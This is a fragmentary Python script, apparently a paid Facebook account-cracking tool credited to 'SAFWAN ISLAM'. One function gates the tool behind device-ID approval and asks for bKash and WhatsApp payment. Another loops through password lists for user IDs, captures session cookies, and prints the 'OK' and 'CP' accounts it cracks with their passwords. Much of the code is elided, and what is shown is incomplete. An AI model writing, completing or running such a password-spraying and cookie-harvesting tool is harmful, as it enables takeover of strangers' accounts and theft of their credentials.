...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ SAFU ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  SAFWAN ISLAM        
               \033[1;91mFACEBOK      :  SAFWAN ISLAM
               \033[1;97mGITHUB       :  SAFWAN GAIMING
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://safwanislam5129.blogspot.com/2023/11/approvaltxt.html').text
    if id in httpCaht:
      ...
      print('BKASH PERSONAL - +8801568722961)
      print('Send Pay And Give Ss And Send Me Key Or Ss Me Whatsapp')
      print('\33[1;37m----------------------------------------------')
      input('IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801568722961='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mSAFWAN-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(SAFWAN-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
        ...
        #sys.stdout.write('\r%s   [SAFWAN] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
       # sys.stdout.flush()
